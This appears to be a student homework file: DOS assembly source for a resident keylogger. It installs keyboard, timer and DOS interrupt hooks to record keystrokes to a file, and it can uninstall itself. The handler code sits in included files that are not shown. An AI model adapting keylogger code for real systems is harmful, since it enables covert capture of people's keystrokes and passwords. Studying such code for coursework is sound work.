;=================================
;            HOMEWORK 1
;            KEYLOGGER
;=================================



org 100h

segment .code

_main:
  ;choosing uninstall or install option
  call uninstall_check
  je .uninstall
.install:
  ;check to see if it is already installed
  call already_installed_check
  je .error_already_installed
.success:
  call set_file_name ; getting filename from command line and setting it for usage
  call install_dos_handler ; install dos handler - waiting for flag to write to file
  call install_flush_timer ; on every delay interval it tries to write to file if buffer non zero
  call install_keyboard_handler ; keyboard handler takes every keystroke to buffer 
  ;set segment of 60h on this - for checking if this is installed
  call override_60h

  ;display message of successful install
  mov ax, cs
  mov es, ax
  mov di, installed_message
  call _print_asciiz_string
  jmp .end ; go to end, dont execute next block
.error_already_installed:
  ;if keylogger already installed then 
  ;display message and terminate
  mov ax, cs
  mov es, ax
  mov di, already_installed_message
  call _print_asciiz_string
  ret ; we dont want to stay resident

.uninstall:
  call already_installed_check
  jne .error_not_installed
.success_un:
  ;mov al, 'S'
  ;call _printc
  ;uninstalling all installed ints
  call uninstall_keyboard_handler
  call uninstall_flush_timer
  call uninstall_dos_handler
  call _close_file ; closing opened file
  call restore_60h ; restoring old 60h segment
  
  ;removing tsr from memory
  mov ax, cs
  mov es, ax
  mov ah, 49h
  int 21h

  ;display message of successful uninstall
  mov ax, cs
  mov es, ax
  mov di, uninstalled_message
  call _print_asciiz_string
  ret

.error_not_installed:
  ;if keylogger already installed then 
  ;display message and terminate
  mov ax, cs
  mov es, ax
  mov di, not_installed_message
  call _print_asciiz_string
  ret ; we dont want to stay resident

.end:
  ;here we will stay resident
  mov dx, 00fffh
  mov ah, 31h
  mov al, 0h
  int 21h
	
;helper functions for main program

;checks if program is called for uninstall
uninstall_check:
  pusha
  push ds
  push es
  ; segment setup
  mov ax, cs
  mov ds, ax
  mov es, ax

  call _get_command_line;returns first character of ANSIIZ string of command line in si
  mov di, end_id        ;identificator for uninstall
  call _str_equals      ;checks to see if si and di are equal, sets flags 
  
  pop es
  pop ds
  popa
  ret

already_installed_check:
  pusha
  push ds
  push es
  ;setting up segment
  mov ax, cs
  mov ds, ax
  ;setting offset of id variable
  mov di, program_id
  mov si, program_id
  ;setting to zero
  xor ax, ax
  mov es, ax  
  ;get segment of potential installed program
  ;which is stored at [00h:60h*4+2] 
  ;if our program is installed
  mov ax, [es:60h*4+2]
  mov es, ax
  ;call _print_asciiz_string
  ;now lets see if there is same thing in offset 
  ;of program_id at segment written in 60h and here
  call _str_equals
.end:
  pop es
  pop ds
  popa
  ret

set_file_name:
  pusha
  push ds
  push es
  ; setup of segments
  mov ax, cs
  mov ds, ax
  mov es, ax
  call _get_command_line
  mov di, file_name
  ; copy file name to file_name
.loop:
  mov al, [si]
  mov [di], al
  inc di
  inc si
  test al, al  ; aciiz
  jnz .loop

  pop es
  pop ds
  popa
  ret

override_60h:
  pusha
  push ds
  push es
  mov ax, cs
  mov ds, ax
  ;blocking usage of interrupts
  cli
  
  ;initializing es to be 0 (int table is in 0th segment)
  xor ax, ax
  mov es, ax
  ;saving old value of segment
  mov ax, [es:60h*4+2]
  mov [old_60h_segment], ax
  ;installing this interrupt
  ;segment is same as this code segment - com only
  mov [es:60h*4+2], cs
  
  ;unblocking usage of interrupts
  sti
  pop es
  pop ds
  popa
  ret

restore_60h:
  pusha
  push ds
  push es
  mov ax, cs
  mov ds, ax
  ;blocking usage of interrupts
  cli

  ;initializing es to be 0 (int table is in 0th segment)
  xor ax, ax
  mov es, ax
  ;restore value of segment
  mov ax, [old_60h_segment] 
  mov [es:60h*4+2], ax
  ;unblocking usage of interrupts
  sti
  pop es
  pop ds
  popa
  ret

%include 'utils.asm'
%include 'kbh.asm'
%include 'timer.asm'
%include 'dos.asm'

segment .data

end_id: db '-kraj', 0
old_60h_segment: dw 0
;messages
uninstalled_message: db "Keylogger succesfully uninstalled", 0
not_installed_message: db "Keylogger not installed, so it cant be removed", 0
installed_message: db "Keylogger successfully installed", 0
already_installed_message: db "Keylogger is already installed", 0
;program_id is for identification if the program is already installed
program_id: db 'keylogeridentifikatormorabitidugacakkakobihsveourosevkomentardajetooneinamillionalisadajevisebrojkojineznamdaizgovorim', 0
